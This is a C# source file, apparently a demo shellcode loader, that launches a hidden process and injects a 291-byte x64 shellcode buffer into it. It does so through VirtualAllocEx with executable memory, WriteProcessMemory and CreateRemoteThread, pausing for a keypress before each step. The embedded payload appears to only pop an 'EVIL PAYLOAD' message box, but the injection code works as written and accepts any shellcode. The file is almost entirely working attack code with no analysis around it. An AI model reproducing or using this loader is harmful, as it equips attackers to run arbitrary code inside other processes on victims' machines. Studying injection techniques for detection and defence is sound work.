using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace DemoBasicLoader
{
    class Program
    {
        public static byte[] buf = new byte[291] {
            0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
            0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
            0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
            0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
            0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
            0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
            0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
            0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
            0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
            0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
            0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
            0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
            0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
            0x85,0x0b,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
            0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x45,0x56,0x49,
            0x4c,0x20,0x50,0x41,0x59,0x4c,0x4f,0x41,0x44,0x00,0x4d,0x65,0x73,0x73,0x61,
            0x67,0x65,0x42,0x6f,0x78,0x00 };


        public static IntPtr SpawnNewProcess(string processName)
        {
            STRUCTS.STARTUPINFO si = new STRUCTS.STARTUPINFO();
            STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();
            bool success = IMPORTS.CreateProcessA(null, processName,
                IntPtr.Zero, IntPtr.Zero, false,
                STRUCTS.ProcessCreationFlags.CREATE_NO_WINDOW,
                IntPtr.Zero, null, ref si, out pi);

            Console.WriteLine("Process {0} Created! \n PID: {1}", processName, pi.dwProcessId);
            return pi.hProcess;
        }

        public static void Inject(IntPtr processHandle, byte[] shellcode)
        {
            IntPtr written = IntPtr.Zero;
            Console.WriteLine("Hit a key to alloc memory");
            Console.ReadKey();
            IntPtr memoryaddr = IMPORTS.VirtualAllocEx(processHandle, IntPtr.Zero, (uint)(shellcode.Length), STRUCTS.AllocationType.Commit | STRUCTS.AllocationType.Reserve, STRUCTS.MemoryProtection.ExecuteReadWrite);
            Console.WriteLine("Hit a key to write memory");
            Console.ReadKey();
            IMPORTS.WriteProcessMemory(processHandle, memoryaddr, shellcode, shellcode.Length, out written);
            Console.WriteLine("Hit a key to create the thread and launch our shellcode!");
            Console.ReadKey();
            IMPORTS.CreateRemoteThread(processHandle, IntPtr.Zero, 0, memoryaddr, IntPtr.Zero, 0, IntPtr.Zero);
        }


        static void Main(string[] args)
        {
            IntPtr procHandle = SpawnNewProcess(args[0]);
            Inject(procHandle, buf);
        }
    }
}
